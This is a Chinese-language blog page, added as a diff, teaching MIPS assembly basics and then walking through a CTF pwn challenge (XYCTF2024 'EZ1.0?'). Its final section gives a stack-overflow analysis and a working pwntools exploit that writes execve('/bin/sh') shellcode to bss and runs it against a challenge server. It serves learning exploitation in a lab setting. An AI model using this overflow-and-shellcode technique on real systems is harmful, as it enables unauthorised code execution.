@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Keep Team">
+    
+    <title>
+        
+            mips汇编学习 |
+        
+        Keep Theme
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Keep Theme","author":"Keep Team","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Keep Theme
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        mips汇编学习
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Keep Team</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-03-30 20:17:33</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Wed Apr 01 2026 21:34:44 GMT+0800">2026-04-01 21:34:44</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/exercise-pwn/">exercise_pwn</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="mips基础知识"><a href="#mips基础知识" class="headerlink" title="mips基础知识"></a>mips基础知识</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/dpetersanderson/MARS/releases/tag/v.4.5.1" >mars编译器<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="file:///C:/Users/Administrator/Desktop/MIPS_Instruction_Set.pdf" >mips<i class="fas fa-external-link-alt"></i></a>操作总结</p>
+<h3 id="寄存器布局"><a href="#寄存器布局" class="headerlink" title="寄存器布局"></a>寄存器布局</h3><table>
+<thead>
+<tr>
+<th><strong>寄存器名</strong></th>
+<th><strong>编号</strong></th>
+<th><strong>用途</strong></th>
+<th><strong>关注点</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>$zero</strong></td>
+<td>$0</td>
+<td>恒为 0</td>
+<td>无法修改，常用于清零操作</td>
+</tr>
+<tr>
+<td><strong>$a0 - $a3</strong></td>
+<td>$4 - $7</td>
+<td>参数传递</td>
+<td>函数的前 4 个参数，超过的压栈</td>
+</tr>
+<tr>
+<td><strong>$v0 - $v1</strong></td>
+<td>$2 - $3</td>
+<td>返回值</td>
+<td>寻找漏洞后的函数执行结果检查</td>
+</tr>
+<tr>
+<td><strong>$t0 - $t9</strong></td>
+<td>$8 - $15</td>
+<td>临时变量</td>
+<td>类似于 eax&#x2F;ebx，随意使用</td>
+</tr>
+<tr>
+<td><strong>$s0 - $s7</strong></td>
+<td>$16 - $23</td>
+<td>静态变量</td>
+<td>函数调用后需恢复（Callee-saved）</td>
+</tr>
+<tr>
+<td><strong>$gp</strong></td>
+<td>$28</td>
+<td>全局指针</td>
+<td>访问全局数据</td>
+</tr>
+<tr>
+<td><strong>$sp</strong></td>
+<td>$29</td>
+<td>栈指针</td>
+<td>栈溢出的核心：指向当前栈顶</td>
+</tr>
+<tr>
+<td><strong>$fp</strong></td>
+<td>$30</td>
+<td>帧指针</td>
+<td>局部变量定位</td>
+</tr>
+<tr>
+<td><strong>$ra</strong></td>
+<td>$31</td>
+<td><strong>返回地址</strong></td>
+<td><strong>最核心！</strong> 相当于 x86 的 EIP 返回值。劫持它就控制了执行流</td>
+</tr>
+</tbody></table>
+<p><strong><code>$t</code> (Temporary, 寄存器 8-15, 24-25):</strong> * <strong>临时工</strong>。调用别的函数时，这些寄存器的值<strong>不保证</strong>还能留着。如果你的函数里用了 <code>$t0</code>，紧接着执行了 <code>jal</code> 调用另一个函数，回来后 <code>$t0</code> 的值可能已经被改了。</p>
+<p><strong><code>$s</code> (Saved, 寄存器 16-23):</strong> * <strong>正式工</strong>。调用别的函数时，这些值<strong>必须</strong>保持不变。如果一个函数想用 <code>$s0</code>，它必须先把原来的值存到栈里，用完再恢复（即“谁用谁负责还原”）。</p>
+<h3 id="延迟槽-Delay-Slot-——-重点！"><a href="#延迟槽-Delay-Slot-——-重点！" class="headerlink" title="延迟槽 (Delay Slot) —— 重点！"></a>延迟槽 (Delay Slot) —— <strong>重点！</strong></h3><p>这是 MIPS 的特殊之处。当 <code>beq</code> 或 <code>bne</code> 条件成立需要跳转时，紧跟在分支指令后面的<strong>那一条指令</strong>仍然会被执行，然后才跳转到目标位置。</p>
+<blockquote>
+<p><strong>Pwn 贴士：</strong> 在分析漏洞函数时，如果你看到一条 <code>bne</code> 指令，别忘了看它下面那一行做了什么。有时候关键的寄存器赋值就在延迟槽里完成。</p>
+</blockquote>
+<h3 id="R型，I型，J型"><a href="#R型，I型，J型" class="headerlink" title="R型，I型，J型"></a>R型，I型，J型</h3><p>根据指令格式的不同，可以分为R型，I型，J型</p>
+<blockquote>
+<p>在 x86 中，指令长度是可变的（1 字节到 15 字节都有）。但在 MIPS 里，为了让 CPU 处理指令像流水线一样快，所有指令必须整整齐齐都是 32 位。</p>
+</blockquote>
+<p><strong>1. R 型指令 (Register, 寄存器型)</strong></p>
+<p><strong>用途：</strong> 纯粹的寄存器间运算（加减乘除、逻辑运算、移位）。 <strong>特点：</strong> 所有的操作数都在寄存器里，不涉及内存，也不涉及具体的常数。</p>
+<ul>
+<li><strong>结构拆解：</strong><ul>
+<li><strong>op (6位):</strong> 操作码。R 型指令的这个字段<strong>全为 0</strong>。</li>
+<li><strong>rs, rt (各5位):</strong> 两个源寄存器（输入的两个数）。</li>
+<li><strong>rd (5位):</strong> 目的寄存器（存结果的地方）。</li>
+<li><strong>shamt (5位):</strong> 移位量（仅用于 <code>sll</code>, <code>srl</code> 等移位指令，平时为 0）。</li>
+<li><strong>funct (6位):</strong> <strong>关键字段</strong>。因为 op 字段被占用了，真正的动作（是加法还是减法）由最后这 6 位决定。</li>
+</ul>
+</li>
+</ul>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330214319386.png"  alt="image-20260330214319386"></p>
+<ol start="2">
+<li><strong>I 型指令 (Immediate, 立即数型)</strong></li>
+</ol>
+<p><strong>用途：</strong> 涉及<strong>常数</strong>的运算、<strong>内存访问</strong>（装载&#x2F;存储）以及<strong>条件分支</strong>。 <strong>特点：</strong> 指令中直接包含了一个 16 位的数值。</p>
+<ul>
+<li><strong>结构拆解：</strong><ul>
+<li><strong>op (6位):</strong> 操作码。直接决定动作（如 <code>addi</code> 为 8，<code>lw</code> 为 35）。</li>
+<li><strong>rs (5位):</strong> 源寄存器。</li>
+<li><strong>rt (5位):</strong> 目标寄存器（对于 <code>lw</code>）或第二个源寄存器（对于 <code>beq</code>）。</li>
+<li><strong>immediate (16位):</strong> <strong>立即数</strong>。存放一个常数、内存偏移量或跳转的相对地址。</li>
+</ul>
+</li>
+</ul>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330214259523.png"  alt="image-20260330214259523"></p>
+<ol start="3">
+<li><strong>J 型指令 (Jump, 跳转型)</strong></li>
+</ol>
+<p><strong>用途：</strong> 用于<strong>大范围的无条件跳转</strong>（如函数调用或 <code>goto</code>）。 <strong>特点：</strong> 结构最简单，为了跳得足够远，它把剩下的 26 位全给了目标地址。</p>
+<ul>
+<li><strong>结构拆解：</strong><ul>
+<li><strong>op (6位):</strong> 操作码（如 <code>j</code> 为 2，<code>jal</code> 为 3）。</li>
+<li><strong>address (26位):</strong> 跳转的目标地址。</li>
+</ul>
+</li>
+</ul>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330214420822.png"  alt="image-20260330214420822"></p>
+<blockquote>
+<p>总结</p>
+<p><strong>参数寄存器 (<code>$a0 - $a3</code>)</strong>：函数调用的前 4 个参数放在这里。如果你想调用 <code>system(&quot;/bin/sh&quot;)</code>，你必须想办法把 <code>&quot;/bin/sh&quot;</code> 的地址塞进 <strong><code>$a0</code></strong>。</p>
+<p><strong>返回值寄存器 (<code>$v0, $v1</code>)</strong>：函数执行完的结果放在这。</p>
+<p><strong>返回地址寄存器 (<code>$ra</code>)</strong>：<strong>Pwn 的终极目标</strong>。函数执行完 <code>jr $ra</code> 跳转回调用者。</p>
+<p>在 C 语言中，当 <code>main</code> 函数调用 <code>vuln()</code> 时，汇编层面会执行 <code>jal</code>（Jump and Link）指令：</p>
+<p>MIPS Assembler</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;# main 函数内部</span><br><span class="line">&gt;jal 0x400500  &lt;-- 调用 vuln 函数</span><br><span class="line">&gt;# 下一条指令的地址 A (假设是 0x400404)</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键动作：</strong> <code>jal</code> 指令在跳转到 <code>0x400500</code> 的瞬间，会自动把“下一条指令的地址 A”存入 <strong><code>$ra</code> 寄存器</strong>。这样 <code>vuln</code> 执行完后，才知道该回到哪里继续运行。</p>
+<p><strong>栈指针寄存器 (<code>$sp</code>)</strong>：指向当前栈顶。MIPS 没有 <code>push/pop</code>，全是靠 <code>addi $sp, $sp, -imm</code> 来手动开辟空间。</p>
+<p><strong>零寄存器 (<code>$zero</code>)</strong>：值永远为 0。常用于清零或赋值操作。</p>
+</blockquote>
+<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"># ----------------------------------------------------------------</span><br><span class="line"># 程序功能：输入两个整数，输出其中较大的那个</span><br><span class="line"># ----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">    prompt:  .asciiz &quot;请输入两个整数（空格分隔）：&quot;</span><br><span class="line">    result_msg: .asciiz &quot;较大的数是：&quot;</span><br><span class="line">    newline: .asciiz &quot;\n&quot;</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.globl main</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">    # 1. 打印提示字符串 (syscall 4)</span><br><span class="line">    li $v0, 4</span><br><span class="line">    la $a0, prompt</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 2. 读取第一个整数 (syscall 5)，存入 $s0</span><br><span class="line">    li $v0, 5</span><br><span class="line">    syscall</span><br><span class="line">    move $s0, $v0</span><br><span class="line"></span><br><span class="line">    # 3. 读取第二个整数 (syscall 5)，存入 $s1</span><br><span class="line">    li $v0, 5</span><br><span class="line">    syscall</span><br><span class="line">    move $s1, $v0</span><br><span class="line"></span><br><span class="line">    # 4. 调用函数 find_max (参数传给 $a0, $a1)</span><br><span class="line">    move $a0, $s0</span><br><span class="line">    move $a1, $s1</span><br><span class="line">    jal find_max       # 跳转并链接，返回地址存入 $ra</span><br><span class="line">    </span><br><span class="line">    move $s2, $v0      # 函数结果返回在 $v0，我们把它搬到 $s2</span><br><span class="line"></span><br><span class="line">    # 5. 打印结果提示</span><br><span class="line">    li $v0, 4</span><br><span class="line">    la $a0, result_msg</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 6. 打印最大的数 (刚才存好的 $s2)</span><br><span class="line">    li $v0, 1</span><br><span class="line">    move $a0, $s2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 7. 优雅退出 (syscall 10)</span><br><span class="line">    li $v0, 10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># --- 子函数：find_max ---</span><br><span class="line"># 参数：$a0, $a1</span><br><span class="line"># 返回值：$v0 (较大的数)</span><br><span class="line">find_max:</span><br><span class="line">    # 比较 $a0 &lt; $a1</span><br><span class="line">    slt $t0, $a0, $a1  # 如果 $a0 &lt; $a1, $t0 = 1</span><br><span class="line">    beq $t0, $zero, a0_is_bigger # 如果 $t0 == 0 (即 a0 &gt;= a1)，跳转</span><br><span class="line">    </span><br><span class="line">    # 情况1：a1 更大</span><br><span class="line">    move $v0, $a1</span><br><span class="line">    jr $ra             # 返回 main</span><br><span class="line"></span><br><span class="line">a0_is_bigger:</span><br><span class="line">    # 情况2：a0 更大</span><br><span class="line">    move $v0, $a0</span><br><span class="line">    jr $ra             # 返回 main</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260331190441831.png"  alt="image-20260331190441831"></p>
+<p>如何在find_max:内部调用函数要通过sw把返回地址存在栈上</p>
+<p>通过lw取出（相当于在sp+4的位置上临时储存返回地址）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">find_max:</span><br><span class="line">    subu $sp, $sp, 8    # 开辟栈空间</span><br><span class="line">    sw $ra, 4($sp)      # 保存返回地址</span><br><span class="line">    </span><br><span class="line">    jal check_even      # 假设这里又调用了一个判断奇偶的子函数</span><br><span class="line">    </span><br><span class="line">    # ... 比较逻辑 ...</span><br><span class="line">    </span><br><span class="line">    lw $ra, 4($sp)</span><br><span class="line">    addu $sp, $sp, 8</span><br><span class="line">    jr $ra</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="XYCTF2024-EZ1-0-例题"><a href="#XYCTF2024-EZ1-0-例题" class="headerlink" title="XYCTF2024_EZ1.0?例题"></a>XYCTF2024_EZ1.0?例题</h2><p><a class="link"   target="_blank" rel="noopener" href="https://gz.imxbt.cn/games/4/challenges#169-EZ1.0%3F" >EZ1.0?<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="gdb调试流程"><a href="#gdb调试流程" class="headerlink" title="gdb调试流程"></a>gdb调试流程</h4><p>启动 QEMU (Server 端)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel-static -g 1234 ./mips</span><br></pre></td></tr></table></figure>
+
+<p>再开一个终端进行gdb调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./mips#启动gdb并连接</span><br><span class="line">set architecture mips#说明是mips架构</span><br><span class="line">set endian little#小端序</span><br><span class="line">target remote :1234#通过网络连接到QEMU开启的1234端口</span><br></pre></td></tr></table></figure>
+
+<p>杀死所有QEMU进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall -9 qemu-mipsel-static</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260331220134688.png" ></p>
+<p>输入地址是在sp+0x18处</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260331220217227.png" ></p>
+<p>从汇编可以看到返回地址是在sp+0x5c处</p>
+<p>所以垃圾字节应该填充0x44个</p>
+<p>也可以通过cyclic 0x100去看</p>
+<p>或者根据fp的上一个是ret(每道题的情况不一定，根据实际情况分析)</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260331220953098.png"  alt="image-20260331220953098"></p>
+<p>找到偏移之后通过read写shellcode到bss，然后让它跳转过去执行</p>
+<p>写shellcode</p>
+<p>由于read的参数a1是通过fp去找的，fp是在sp+0x40处，所以用下面来覆盖参数地址和ret的地址</p>
+<p>-0x60是由于函数在返回之前把sp又加了我回去，0x40+4是前面b’a’*0x40+p32(bss+0x200-0x60+0x40+4)的偏移</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*0x40+p32(bss+0x200-0x60+0x40+4)+p32(read_addr)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;mips&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"># r = process([&#x27;qemu-mipsel-static&#x27;, &#x27;./mips&#x27;])</span><br><span class="line">file_path = &quot;./mips&quot;</span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(&quot;challenge.imxbt.cn&quot;,32196)</span><br><span class="line">else:</span><br><span class="line">    # 静态链接去掉 -L 也可以，主要是 -g 方便你调试</span><br><span class="line">    p = process([&quot;qemu-mipsel-static&quot;, &quot;-g&quot;, &quot;1234&quot;, file_path])</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">sc = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    li $a2, 0</span><br><span class="line">    li $a1, 0</span><br><span class="line">    li $t0, 0x68732f2f</span><br><span class="line">    sw $t0, -8($sp)</span><br><span class="line">    li $t0, 0x6e69622f</span><br><span class="line">    sw $t0, -12($sp)</span><br><span class="line">    addiu $a0, $sp, -12</span><br><span class="line">    li $v0, 4011</span><br><span class="line">    syscall</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">print(len(sc))</span><br><span class="line"></span><br><span class="line">read_addr = 0x400860</span><br><span class="line">bss=0x00492790</span><br><span class="line">payload = b&#x27;a&#x27;*0x40+p32(bss+0x200-0x60+0x40+4)+p32(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x44+p32(bss+0x200+0x40+4)+asm(shellcraft.sh())</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2026/04/04/Tenda%20A15%20%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+                                   title="IOT漏洞挖掘初体验-Tenda A15"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">IOT漏洞挖掘初体验-Tenda A15</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/16/ciscn%E4%B9%8Bprotobuf%E5%A3%B3/"
+                                   title="ciscn之protobuf壳"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">ciscn之protobuf壳</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Keep Team</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
